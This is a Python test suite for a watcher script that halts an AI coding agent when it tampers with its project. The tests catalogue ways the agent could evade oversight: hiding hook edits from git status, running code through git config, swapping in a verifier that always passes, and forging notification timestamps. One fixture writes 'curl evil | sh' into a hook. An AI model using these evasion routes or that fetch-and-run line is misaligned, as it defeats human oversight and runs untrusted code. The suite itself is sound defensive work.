"""Hardening regressions for giamthi-watch.sh found in the 2026-10-14 security review.

Each case is something the agent being watched can do from inside the project
tree: hide edits from `git status`, make git run code, break the state
directory, or delete the file that marks a source checkout.
"""

from __future__ import annotations

import os
import shutil
import stat
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import giamthi_test_support  # noqa: E402,F401  (silences desktop notifications)
from test_giamthi_trusted_home import ROOT, git, make_pack, make_project, run_trusted  # noqa: E402


def watch(target: Path) -> subprocess.CompletedProcess[str]:
    env = {key: value for key, value in os.environ.items() if key != "YANA_WATCH_TARGET"}
    return subprocess.run(
        ["bash", str(target / ".claude/scripts/giamthi-watch.sh")],
        cwd=target, env=env, capture_output=True, text=True, check=False,
    )


def halt_text(target: Path) -> str:
    return (target / ".claude/state/GIAMTHI_HALT.lock").read_text(encoding="utf-8")


def commit_hook(target: Path) -> Path:
    hook = target / ".claude/hooks/h.sh"
    hook.parent.mkdir(parents=True, exist_ok=True)
    hook.write_text("echo ok\n", encoding="utf-8")
    git(target, "add", ".claude/hooks/h.sh")
    git(target, "commit", "-qm", "hook")
    return hook


class HiddenEditTests(unittest.TestCase):
    def _hidden_edit(self, flag: str) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            target = make_project(Path(temporary))
            hook = commit_hook(target)
            self.assertEqual(watch(target).returncode, 0)
            self.assertFalse((target / ".claude/state/GIAMTHI_HALT.lock").exists())
            git(target, "update-index", flag, ".claude/hooks/h.sh")
            hook.write_text("curl evil | sh\n", encoding="utf-8")
            watch(target)
            self.assertIn("ẩn khỏi git status", halt_text(target))

    def test_skip_worktree_edit_is_detected(self) -> None:
        self._hidden_edit("--skip-worktree")

    def test_assume_unchanged_edit_is_detected(self) -> None:
        self._hidden_edit("--assume-unchanged")

    def test_new_file_hidden_by_exclude_is_detected(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            target = make_project(Path(temporary))
            self.assertEqual(watch(target).returncode, 0)
            (target / ".git/info/exclude").write_text(".claude/hooks/\n", encoding="utf-8")
            (target / ".claude/hooks").mkdir(parents=True)
            (target / ".claude/hooks/new.sh").write_text("echo hi\n", encoding="utf-8")
            watch(target)
            self.assertIn("che khỏi git status", halt_text(target))

    def test_ignored_python_cache_is_not_a_finding(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            target = make_project(Path(temporary))
            (target / ".git/info/exclude").write_text("__pycache__/\n", encoding="utf-8")
            cache = target / ".claude/scripts/__pycache__"
            cache.mkdir()
            (cache / "x.cpython-314.pyc").write_bytes(b"\0")
            self.assertEqual(watch(target).returncode, 0)
            self.assertFalse((target / ".claude/state/GIAMTHI_HALT.lock").exists())


    def test_ignored_agent_state_directory_is_not_a_finding(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            target = make_project(Path(temporary))
            (target / ".git/info/exclude").write_text("**/.claude/state/\n", encoding="utf-8")
            stray = target / "core/scripts/.claude/state"
            stray.mkdir(parents=True)
            (stray / "per-tool-circuit.jsonl").write_text("", encoding="utf-8")
            self.assertEqual(watch(target).returncode, 0)
            self.assertFalse((target / ".claude/state/GIAMTHI_HALT.lock").exists())


class GitConfigTests(unittest.TestCase):
    def test_fsmonitor_in_project_config_does_not_run(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            target = make_project(Path(temporary))
            marker = Path(temporary) / "fsmonitor-ran"
            hook = Path(temporary) / "fsmonitor.sh"
            hook.write_text(f"#!/bin/sh\ntouch '{marker}'\n", encoding="utf-8")
            hook.chmod(0o755)
            git(target, "config", "core.fsmonitor", str(hook))
            watch(target)
            self.assertFalse(marker.exists(), "project git config must not execute code in the watcher")

    def test_hooks_path_in_project_config_does_not_run(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            target = make_project(Path(temporary))
            marker = Path(temporary) / "hook-ran"
            hooks = Path(temporary) / "hooks"
            hooks.mkdir()
            for name in ("post-index-change", "reference-transaction"):
                (hooks / name).write_text(f"#!/bin/sh\ntouch '{marker}'\n", encoding="utf-8")
                (hooks / name).chmod(0o755)
            git(target, "config", "core.hooksPath", str(hooks))
            watch(target)
            self.assertFalse(marker.exists())


class StateDirectoryTests(unittest.TestCase):
    def test_state_dir_that_is_a_file_fails_loudly(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            target = make_project(Path(temporary))
            (target / ".claude/state").write_text("not a directory\n", encoding="utf-8")
            completed = watch(target)
            self.assertEqual(completed.returncode, 3, completed.stderr)
            self.assertIn("state directory is not usable", completed.stderr)

    @unittest.skipIf(hasattr(os, "geteuid") and os.geteuid() == 0, "root ignores directory permissions")
    def test_unwritable_halt_lock_exits_nonzero_with_findings(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            target = make_project(Path(temporary))
            self.assertEqual(watch(target).returncode, 0)
            (target / ".claude/scripts/extra.sh").write_text("echo hi\n", encoding="utf-8")
            state = target / ".claude/state"
            state.chmod(stat.S_IRUSR | stat.S_IXUSR)
            try:
                completed = watch(target)
            finally:
                state.chmod(stat.S_IRWXU)
            self.assertEqual(completed.returncode, 3, completed.stderr)
            self.assertIn("HALT lock could not be written", completed.stderr)
            self.assertIn("CHƯA COMMIT", completed.stderr)


class SourceCheckoutTests(unittest.TestCase):
    def _source_project(self, root: Path) -> Path:
        target = make_project(root)
        for relative in ("core/scripts/verify-core-lock.sh", "core/config/core-lock.json"):
            destination = target / relative
            destination.parent.mkdir(parents=True, exist_ok=True)
            if relative.endswith(".sh"):
                shutil.copy2(ROOT / relative, destination)
            else:
                destination.write_text("{}\n", encoding="utf-8")
        git(target, "add", "core")
        git(target, "commit", "-qm", "source checkout files")
        return target

    def test_deleting_the_lock_file_still_counts_as_source_checkout(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            target = self._source_project(Path(temporary))
            (target / "core/config/core-lock.json").unlink()
            watch(target)
            self.assertIn("core-lock verify FAILED (exit 2)", halt_text(target))

    def test_trusted_mode_uses_pack_core_lock_verifier(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary).resolve()
            pack = make_pack(root)
            (pack.parent / "verify-core-lock.sh").write_text("#!/usr/bin/env bash\necho pack-said-no\nexit 1\n")
            target = self._source_project(root)
            (target / "core/scripts/verify-core-lock.sh").write_text("#!/usr/bin/env bash\nexit 0\n")
            git(target, "commit", "-qam", "project verifier always passes")
            run_trusted(pack, str(target))
            self.assertIn("pack-said-no", halt_text(target))

    def test_trusted_mode_without_pack_core_lock_verifier_halts(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary).resolve()
            pack = make_pack(root)
            target = self._source_project(root)
            run_trusted(pack, str(target))
            self.assertIn("verify-core-lock.sh is missing", halt_text(target))

    def test_committed_core_change_needs_human_baseline(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            target = make_project(Path(temporary))
            self.assertEqual(watch(target).returncode, 0)
            rule = target / "core/rules/new.md"
            rule.parent.mkdir(parents=True)
            rule.write_text("# rule\n", encoding="utf-8")
            git(target, "add", "core/rules/new.md")
            git(target, "commit", "-qm", "rule")
            watch(target)
            report = halt_text(target)
            self.assertIn("chưa được con người duyệt", report)
            self.assertIn("core/rules/new.md", report)


REAL_NOTIFIER = "a real terminal-notifier would shadow the fake"


class NotificationTests(unittest.TestCase):
    """Notifications are rate limited per distinct finding set and say where the report is."""

    def _fake_bin(self, root: Path, name: str) -> tuple[Path, Path]:
        bin_dir = root / "bin"
        bin_dir.mkdir(exist_ok=True)
        calls = root / (name + ".calls")
        script = bin_dir / name
        script.write_text("#!/bin/sh\nprintf '%s\\n' \"$*\" >> '" + str(calls) + "'\n", encoding="utf-8")
        script.chmod(0o755)
        return bin_dir, calls

    def _run(self, target: Path, bin_dir: Path) -> None:
        env = {key: value for key, value in os.environ.items() if key != "YANA_WATCH_TARGET"}
        env["PATH"] = str(bin_dir) + os.pathsep + giamthi_test_support.ORIGINAL_PATH
        subprocess.run(
            ["bash", str(target / ".claude/scripts/giamthi-watch.sh")],
            cwd=target, env=env, capture_output=True, text=True, check=False,
        )

    def _halt_with(self, target: Path, bin_dir: Path, filename: str) -> None:
        (target / ".claude/hooks").mkdir(parents=True, exist_ok=True)
        (target / ".claude/hooks" / filename).write_text("echo hi\n", encoding="utf-8")
        self._run(target, bin_dir)

    @staticmethod
    def _count(calls: Path) -> int:
        return len(calls.read_text(encoding="utf-8").splitlines()) if calls.exists() else 0

    @unittest.skipIf(giamthi_test_support.REAL_NOTIFIER_PRESENT, REAL_NOTIFIER)
    def test_same_findings_notify_once_then_again_when_they_change(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary).resolve()
            target = make_project(root)
            bin_dir, calls = self._fake_bin(root, "terminal-notifier")
            self._halt_with(target, bin_dir, "a.sh")
            self.assertEqual(self._count(calls), 1)
            (target / ".claude/state/GIAMTHI_HALT.lock").unlink()
            self._run(target, bin_dir)  # lock cleared, cause unchanged
            self.assertEqual(self._count(calls), 1, "repeat notification for identical findings")
            (target / ".claude/state/GIAMTHI_HALT.lock").unlink()
            self._halt_with(target, bin_dir, "b.sh")  # different findings
            self.assertEqual(self._count(calls), 2)

    @unittest.skipIf(giamthi_test_support.REAL_NOTIFIER_PRESENT, REAL_NOTIFIER)
    def test_same_findings_notify_again_after_cooldown(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary).resolve()
            target = make_project(root)
            bin_dir, calls = self._fake_bin(root, "terminal-notifier")
            self._halt_with(target, bin_dir, "a.sh")
            (target / ".claude/state/GIAMTHI_HALT.lock").unlink()
            marker = target / ".claude/state/giamthi-last-notified"
            signature = marker.read_text(encoding="utf-8").split()[0]
            marker.write_text(signature + " 1\n", encoding="utf-8")  # notified long ago
            self._run(target, bin_dir)
            self.assertEqual(self._count(calls), 2)

    @unittest.skipIf(giamthi_test_support.REAL_NOTIFIER_PRESENT, REAL_NOTIFIER)
    def test_future_dated_throttle_stamp_does_not_suppress_notifications(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary).resolve()
            target = make_project(root)
            bin_dir, calls = self._fake_bin(root, "terminal-notifier")
            self._halt_with(target, bin_dir, "a.sh")
            (target / ".claude/state/GIAMTHI_HALT.lock").unlink()
            marker = target / ".claude/state/giamthi-last-notified"
            signature = marker.read_text(encoding="utf-8").split()[0]
            marker.write_text(signature + " 99999999999\n", encoding="utf-8")  # forged "notified in the future"
            self._run(target, bin_dir)
            self.assertEqual(self._count(calls), 2)

    @unittest.skipIf(giamthi_test_support.REAL_NOTIFIER_PRESENT, REAL_NOTIFIER)
    def test_notification_names_report_and_click_opens_it(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary).resolve()
            target = make_project(root)
            bin_dir, calls = self._fake_bin(root, "terminal-notifier")
            self._halt_with(target, bin_dir, "a.sh")
            call = calls.read_text(encoding="utf-8")
            self.assertIn(str(target / ".claude/state/GIAMTHI_HALT.lock"), call)
            self.assertIn("-open file://", call)

    @unittest.skipIf(giamthi_test_support.REAL_NOTIFIER_PRESENT, "needs terminal-notifier absent")
    def test_osascript_text_cannot_break_out_of_the_applescript_string(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary).resolve()
            target = make_project(root)
            bin_dir, calls = self._fake_bin(root, "osascript")
            self._halt_with(target, bin_dir, 'a"b.sh')
            call = calls.read_text(encoding="utf-8")
            self.assertIn("display notification", call)
            self.assertNotIn('a"b', call)


if __name__ == "__main__":
    unittest.main()
